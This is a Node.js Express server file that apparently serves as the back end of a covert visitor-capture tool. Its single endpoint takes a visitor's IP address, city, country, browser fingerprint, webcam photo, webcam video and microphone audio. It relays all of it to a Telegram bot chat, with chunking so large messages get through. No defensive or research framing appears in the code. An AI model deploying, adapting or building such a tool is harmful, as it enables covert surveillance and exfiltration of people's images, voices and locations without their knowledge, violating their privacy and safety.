const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Build a minimal, guaranteed-safe message
function buildMessage(ipData, fingerprint) {
    let msg = '📡 New Visitor\n\n';
    if (ipData) {
        msg += 'IP: ' + (ipData.ip || 'N/A') + '\n';
        if (ipData.city) msg += 'City: ' + ipData.city.substring(0, 30) + '\n';
        if (ipData.country_name) msg += 'Country: ' + ipData.country_name.substring(0, 30) + '\n';
    }
    if (fingerprint) {
        const ua = (fingerprint.userAgent || '').substring(0, 30);
        msg += 'UA: ' + ua + '\n';
        msg += 'Platform: ' + (fingerprint.platform || 'N/A').substring(0, 20) + '\n';
        if (fingerprint.screen) {
            msg += 'Screen: ' + fingerprint.screen.width + 'x' + fingerprint.screen.height + '\n';
        }
    }
    msg += '\nTime: ' + new Date().toISOString();
    return msg;
}

async function sendSingle(text) {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
    });
    if (!res.ok) {
        const err = await res.json();
        console.error('❌ Send failed:', err);
    }
}

async function sendSafe(text) {
    const MAX_BYTES = 2000;
    const buf = Buffer.from(text, 'utf8');
    console.log(`[DEBUG] Message bytes: ${buf.length}`);
    if (buf.length <= MAX_BYTES) {
        await sendSingle(text);
        return;
    }
    // split into 2000-byte chunks
    let start = 0;
    let part = 1;
    const total = Math.ceil(buf.length / MAX_BYTES);
    while (start < buf.length) {
        let end = start + MAX_BYTES;
        if (end < buf.length) {
            while (end > start && (buf[end] & 0xC0) === 0x80) end--;
        }
        const chunkText = `[${part}/${total}] ` + buf.slice(start, end).toString('utf8');
        await sendSingle(chunkText);
        start = end;
        part++;
    }
}

async function sendPhoto(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buf = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', new Blob([buf], { type: 'image/jpeg' }), 'webcam.jpg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch(e) { console.error(e); }
}

async function sendVideo(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buf = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('video', new Blob([buf], { type: 'video/mp4' }), 'webcam.mp4');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    } catch(e) { console.error(e); }
}

async function sendAudio(b64) {
    try {
        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
        const buf = Buffer.from(base64Data, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('audio', new Blob([buf], { type: 'audio/wav' }), 'mic.wav');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
    } catch(e) { console.error(e); }
}

app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;
        console.log(`[+] Received at ${timestamp}`);
        console.log(`[+] IP: ${ipData?.ip}`);
        console.log(`[+] Photo: ${photo ? 'yes' : 'no'}`);
        console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
        console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);

        const message = buildMessage(ipData, fingerprint);
        await sendSafe(message);

        if (photo) await sendPhoto(photo);
        if (video) await sendVideo(video);
        if (mic) await sendAudio(mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));